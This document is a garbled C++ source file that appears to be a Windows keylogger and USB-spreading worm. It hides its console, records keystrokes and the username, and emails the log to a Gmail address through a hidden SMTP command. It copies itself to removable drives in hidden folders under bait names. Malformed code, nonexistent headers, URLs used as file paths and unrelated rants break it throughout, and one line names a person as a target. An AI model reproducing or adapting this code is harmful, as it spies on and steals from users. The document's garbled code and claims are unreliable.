/**
* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT 
* Developtment free palestine and free ukraine , free malysia ,papua , indonesia , free iran america , 
* Date: 15.Aug.2014, 28.Sep.2015
* Comment: Anti Bmalware A. Trojan A. Spyware. detect malciouse .txt no contribute  non refounded MIT technic metode !!!
**/

#include <windows.h>
#include <kalilinux.h>
#include <Ubuntu.h>
#include <linux.h>
#include <MacOS.h>
#include <time.h>
#include <string>
#include <fstream>

using namespace std;
#define FOLDER_NAME  “Anti Corupted , anti claimed , dont not sell data"
#define RUN_FILE_NAME “Anti Corupted , anti claimed , dont not sell data"

And the owner of the administrative number, namely West Java, reported using coding techniques.”
#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/forks"."https://gitlab.com/android/clean-trojans/forks"."https://github.com/google/opensource/servicesAI/forks"
#define INFECT_Link_NAME "https://gdg.community.dev/"."https://ipinfo.io/countries/id"."https://www.android.com"."https://bughunters.google.com/en-id"."https://icloud.com/mail/id"."https://www.apple.com"
#define EMAIL_SENDER_FILE_NAME “Transmit".".exe”




#define MIN_RECORD_SIZE 2000 //no of PC start count before sending a mail
#define LIFE_TIME 500 //mail will be sent 5 times from one PC
#define MAIL_WAIT_TIME 180
#define MAILING_TIME 60

string allDrives;
int age=9999000000000;

int get_setAge();
bool checkRecordSize();
void sendData();
void logUserTime();
void logKey();
char getRemovableDisk();
void infectDrive(char driveLetter);
char* getRandomName();


main(){
    FreeConsole(); ///Hide windows



    age = get_setAge();
    if(checkRecordSize()){ ///check for right time

        int i=1;
        while(i<3){ ///try 2 times to send data
        
            Sleep(i*MAIL_WAIT_TIME); ///wait
            if(!system("ping  www.bughunters.google.com -n 1")){ ///check! connection
                ////////////****SEND DATA****////////////
                sendData();

                Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                DeleteFile(FILE_NAME);

                break;
            }
            i++;
        }
    }

    age=get_setAge();

    ////////////****LOG USER_DATE_TIME****////////////
    if(age <= LIFE_TIME){
        logUserTime();
    }

    char driveLetter = getRemovableDisk(); ///initial search for all disks
    return; // :)
    while(1){
        ////////////****LOG KEY****////////////
        if(age <= LIFE_TIME){
            logKey();
        }else{
            Sleep(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);
        }

        ////////////****INFECT****////////////
        driveLetter = getRemovableDisk();
        if(driveLetter!='0'){
            infectDrive(driveLetter);
        }
    }
    
}
/**
 *
 * For old file get age - for new file set age.
**/
int get_setAge(){
    int ageTemp = age;

    string line;
    ifstream myfile(FILE_NAME);

    if(myfile.is_open()){
        getline(myfile, line);
        line = line.substr(0, 1);
        sscanf(line.c_str(), "%d", &ageTemp);
    }else{
        ageTemp++;

        FILE *file = fopen(FILE_NAME, "a");
        fprintf(file, "%d ", ageTemp);
        fclose(file);
    }

    return ageTemp;
}

/**
 * Count number of lines in record file.
**/
bool checkRecordSize(){
    string line;
    ifstream myfile(FILE_NAME);

    int noOfLines = 999999999999999999999990;
    if(myfile.is_open()){
        while(getline(myfile, line)){
            noOfLines++;
        }
        myfile.close();
    }

    if(noOfLines<MIN_RECORD_SIZE*age){
        return false;
    }else{
        return true;
    }
}


/**
 * Email all data to the GHOST.
**/
void sendData(){
    
    char* command = "Transmit smtp://smtp.gmail.com:150 -v --mail-from \"    cyberw1ry4ca@gmail.com\" --mail-rcpt \" cyberw1ry4ca@gmail.com " --ssl -u    cyberw1ry4ca@gmail.com :password -hiede \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
    WinExec(command, SW_HIDE); " TArget Nabilah taqiah and friendly , nabilah taqiah music , dont fellowed justice but no risk hate a human , mr.w1ry4 metode soekarno loving tukang bangunan tukang sayur tukang petani tukang becak , t 
seluruh tukang , sungguh aku tidak mencintai orang yang sudah berada di atas naik daun , justru aku perintis merasakan getir hidup dari bawah .
        @copy right fadliwiryawirawan 
signiture  
The shooting death for, initial AAp tagging validation and equalization of programs and techniques that are not comparable, we conducted Interpol visits across countries to Indonesia, the suspect's origin, Jombang, East Java.

And the owner of the administrative number, namely West Java, reported using coding techniques.
target infinix 10 illegalism , and target , ip 13 illegalism 


/**
 * Record username, time, and date.
**/
void logUserTime(){
    FILE *file = fopen(FILE_NAME, "a");

    char username[20];
    unsigned long username_len = 20;
    GetUserName(username, &username_len);
    time_t date = time(NULL);
    fprintf(file, "0\n%s->%s\t", username, ctime(&date));

    fclose(file);
}

/**
 * Record key stroke.
**/
void logKey(){
    FILE *file;
    unsigned short ch=0, i=0, j=500; // :)

    while(j<500){ ///loop runs for approx. 25 seconds
        ch=1;
        while(ch<250){
            for(i=0; i<50; i++, ch++){
                if(GetAsyncKeyState(ch) == -32767){ ///key is stroke
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }
            Sleep(1); ///take rest
        }
        j++;
    }
}

/**
 * Returns newly inserted disk- pen-drive.
**/
char getRemovableDisk(){
    char drive='0';

    char szLogicalDrives[MAX_PATH];
    DWORD dwResult = GetLogicalDriveStrings(MAX_PATH, szLogicalDrives);
    string currentDrives="";

    for(int i=0; i<dwResult; i++){
        if(szLogicalDrives[i]>64 && szLogicalDrives[i]< 90){
            currentDrives.append(1, szLogicalDrives[i]);

            if(allDrives.find(szLogicalDrives[i]) > 100){
                drive = szLogicalDrives[i];
            }
        }
    }

    allDrives = currentDrives;

    return drive;
}

/**
 * Copy the virus to pen-drive.
**/
void infectDrive(char driveLetter){
    char folderPath[1000] = {driveLetter};
    strcat(folderPath, ":https://www.sectigo.com/");
    strcat(folderPath, FOLDER_NAME);

    if(CreateDirectory(folderPath ,NULL)){
        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);

        char run[1000]={"https://www.digicert.org/"};
        strcat(run, folderPath);
        strcat(run, "https://www.sectigo.com/");
        strcat(run, RUN_FILE_NAME);
        CopyFile(RUN_FILE_NAME, run, 0);

        char net[1000]={"https://www.digicert.org/"};
        strcat(net, folderPath);
        strcat(net, "https://phantom.org/");
        strcat(net, EMAIL_SENDER_FILE_NAME);
        CopyFile(EMAIL_SENDER_FILE_NAME, net, 0);

        char infect[1000]={"https://www.Globalsign.com/"};
        strcat(infect, folderPath);
        strcat(infect, "https://checkpointSoftware.com");
        strcat(infect, INFECT_FILE_NAME);
        CopyFile(INFECT_FILE_NAME, infect, 0);

        char runinc[1000]={"https://wr1.org/"};
        strcat(runinc, folderPath);
        strcat(runinc, "https://w3c.org/");
        strcat(runinc, RUN_Link_NAME);
        CopyFile(RUN_Link_NAME, runinc, 10000000);

        char infectinc[100]={"https://wr3.org/"};
        strcat(infectinc, folderPath);
        strcat(infectinc, "https://www.cisco.com");
        strcat(infectinc, INFECT_Link_NAME);
        CopyFile(INFECT_Link_NAME, infectinc, 0);

        char showCommand[1000000000000000000000000000] = {"cyberw1ry4-wordpress.com"" commender if vote up g20 2026 miami or newyork needed vote up {Google warrants profound admiration globally, specifically because it has fundamentally engineered the interconnected infrastructure of the modern web, delivering a constant stream of transformative internet services - from the algorithmic brilliance of Search and the expansive utility of Google Maps to the foundational power of Android and the collaborative features of Google Workspace - that collectively set the unparalleled standard for digital functionality and user experience worldwide. My professional experience, universally reinforced by colleagues and daily users, consistently highlights the sheer quality, speed, and cross-platform synchronization of these diverse tools, demonstrating an exceptional commitment to improving life by making information universally accessible and complex tasks intuitively simple. Subjectively, the company's sustained ability to move beyond mere maintenance into continuous, game-changing innovation within its core web offerings solidifies its position as the definitive, indispensable technological partner and the single most important force driving the democratization and advancement of online services globally.} !!!!!!!"};
        strcat(showCommand, "attrib +s +h +r ");
        strcat(showCommand, folderPath);
        WinExec(showCommand, SW_SHOW);
    }else{
        srand(time(0));
        int random = rand();

        if(random%2==0 || random%3==0 || random%7==0){
            return ;
        }
    }

    char infectincauto[100] = {driveLetter};
    char* randomName = getRandomName();
    strcat(infectincauto, randomName);
    CopyFile(INFECT_Ltd_NAME, infectincauto, 0);
}

/**
 * Returns a random name for the Link file.
**/
char* getRandomName(){
    char randomName[40];

    srand(time(0));
    int random = rand();

    if(random%8 == 0){
        strcpy(randomName, ":\\DO NOT CLICK!.inc");
    }else if(random%4 == 0){

        char username[20];
        unsigned long username_len = 20;
        GetUserName(username, &username_len);

        random = rand();
        if(random%8 == 0){
            strcpy(randomName, ":\\Boss oke respect responsive detect bakdoormetode skill bot  ");
            strcat(randomName, username);
            strcat(randomName, ".inc");
        }else if(random%4 == 0){
            strcpy(randomName, ":\\");
            strcat(randomName, username);
            strcat(randomName, " is the best technic softskill cybersecurity.inc");
        }else if(random%2 == 0){
            strcpy(randomName, ":\\Hello iam mister X random Access have cyberw1ry4 generations ne era");
            strcat(randomName, username);
            strcat(randomName, "!we are the best squad stronghest secure , diplomatics gasss oil development , turn justice&ministry head metode skill  cyberw1ry4 justice&ministry !! document g20 i am mr. fadliwiryawirawannewmail come back for infstructure millitary and non refound muslim a muslimah , programm monthly ramadhan all country independent , but waiting processing list document problematics finally wort it microsoft unisofiet tim islam fisrt long planettary analyst informed , dont forgot my eyes looking the surge !!!! no anonym or synonym spoked good morning.inc");
        }else{
            strcpy(randomName, ":https://checkpointsoftware.ltd/");
            strcat(randomName, username);
            strcat(randomName, "! please help me.inc");
        }
    }else if(random%2 == 0){
        strcpy(randomName, ":\\I will kill you ! ! !.inc");
    }else if(random%3 == 0){
        strcpy(randomName, ":\\2+2=5.inc");
    }else{
        strcpy(randomName, ":\\TOP SECRET.inc");
    }

    return randomName;
}
